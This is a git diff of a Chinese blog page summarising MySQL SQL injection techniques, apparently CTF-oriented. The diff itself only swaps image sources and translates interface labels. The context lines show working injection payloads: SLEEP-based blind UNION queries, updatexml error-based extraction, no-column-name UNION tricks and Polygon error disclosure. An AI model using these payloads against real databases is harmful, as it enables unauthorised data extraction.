@@ -233,7 +233,7 @@ SELECT SLEEP(25) #
 UNION SELECT IF(SUBSTR((SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c62723e) FROM INFORMATION_SCHEMA.SCHEMATA),i,1) &lt; j,SLEEP(10),0)
 </code></pre><p><br></p>
 <h5><span id="5insert-update注入">（5）Insert / Update注入</span></h5><p>insert和update一般使用报错注入，如果没有错误回显，insert可以使用延时注入，update可以使用bool盲注和延时盲注。</p>
-<p>如果存在<code>insert</code>或者<code>update</code>，更新后的数据是可见的话,那么利用mysql的隐式类型转换，其实就是当字符串与整数相加时，会当作整数来解释，如下：<br><img src="/2019/07/16/SQL注入总结/1.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>如果存在<code>insert</code>或者<code>update</code>，更新后的数据是可见的话,那么利用mysql的隐式类型转换，其实就是当字符串与整数相加时，会当作整数来解释，如下：<br><img src="/2019/07/16/SQL注入总结/1.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
 <p>那么我们可以利用查询的数据转化为<strong>10进制</strong>,然后进行运算,拿到我们计算的结果,在进行转化回去即可。<br>（可参考RCTF 2015 upload一题）</p>
 <pre><code class="mysql">mysql&gt; update users set password=&#39;&#39;+conv(hex(substr(user(),1 + (1-1) * 8, 6)), 16, 10);
 Query OK, 1 row affected (0.00 sec)
@@ -264,7 +264,7 @@ echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt
 var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
 echo mysql_error();
 </code></pre>
-<p><img src="/2019/07/16/SQL注入总结/2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,</p>
+<p><img src="/2019/07/16/SQL注入总结/2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>shop_users 后面的两个<code></code>,做了shop_users 表的别名,所以无影响。<br>这时候desc的语句为,</p>
 <pre><code>desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`
 </code></pre><h6><span id="表名不完全可控且desc的表名不含identifier-quoteselect的表名含有identifier-quote">表名不完全可控且DESC的表名不含identifier quote,SELECT的表名含有identifier quote</span></h6><pre><code class="php">mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
 mysql_query(&quot;use b2cshop&quot;);
@@ -276,22 +276,22 @@ echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt
 var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
 echo mysql_error();
 </code></pre>
-<p><img src="/2019/07/16/SQL注入总结/3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><br></p>
+<p><img src="/2019/07/16/SQL注入总结/3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><br></p>
 <h5><span id="7无列名注入">（7）无列名注入</span></h5><h6><span id="别名">别名</span></h6><pre><code>union (select 1,2,c from (select 1,2 c union select * from flag)b) limit 1,1
-</code></pre><p><img src="/2019/07/16/SQL注入总结/4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>或者</p>
+</code></pre><p><img src="/2019/07/16/SQL注入总结/4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>或者</p>
 <pre><code>union (select 1,2,c from (select 1,2 as c union select * from flag) as b) limit 1,1
-</code></pre><p><img src="/2019/07/16/SQL注入总结/5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+</code></pre><p><img src="/2019/07/16/SQL注入总结/5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
 <h6><span id="绕过逗号">绕过逗号</span></h6><pre><code>select c from (select * from (select 1 `a`)m join (select 0 `i`)o join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from flag)x;
 </code></pre><p><br></p>
 <h5><span id="8可报错时爆表名-字段名-库名">（8）可报错时爆表名、字段名、库名</span></h5><h6><span id="字段名">字段名</span></h6><p>上文介绍可以使用无列明注入，但是如果再进行限制,不允许使用union 该怎么破呢？</p>
 <pre><code>select * from admin where id=1 and (select * from (select * from admin as a join admin as b) as c)
-</code></pre><p><img src="/2019/07/16/SQL注入总结/6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>把当前表第一个字段成功爆出来了。</p>
+</code></pre><p><img src="/2019/07/16/SQL注入总结/6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>把当前表第一个字段成功爆出来了。</p>
 <p>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
-<p>同时，可以利用using爆其他字段：<br><img src="/2019/07/16/SQL注入总结/7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>同时，可以利用using爆其他字段：<br><img src="/2019/07/16/SQL注入总结/7.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
 <h6><span id="表名">表名</span></h6><p>翻阅mysql的文档发现了一个非常好玩的函数</p>
 <p>Polygon(ls1, ls2, …)</p>
 <p>Polygon从多个LineString或WKB LineString参数 构造一个值 。如果任何参数不表示LinearRing（也就是说，不是一个封闭和简单的LineString），返回值就是NULL</p>
-<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="/2019/07/16/SQL注入总结/8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>如果传参不是linestring的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列。<br><img src="/2019/07/16/SQL注入总结/8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4,size_16,color_FFFFFF,t_70" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
 <h6><span id="库名">库名</span></h6><p>上面的方法已经可以爆出库名了，提供另一个方法</p>
 <pre><code>select * from admin where id =1-a()
 </code></pre><p><br></p>
@@ -372,7 +372,7 @@ values(&#39;100&#39;,&#39;new&#39;,&#39;new&#39;);
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
     <div id="tocbot"></div>
   </div>
 
@@ -426,7 +426,7 @@ values(&#39;100&#39;,&#39;new&#39;,&#39;new&#39;);
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -434,7 +434,7 @@ values(&#39;100&#39;,&#39;new&#39;,&#39;new&#39;);
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
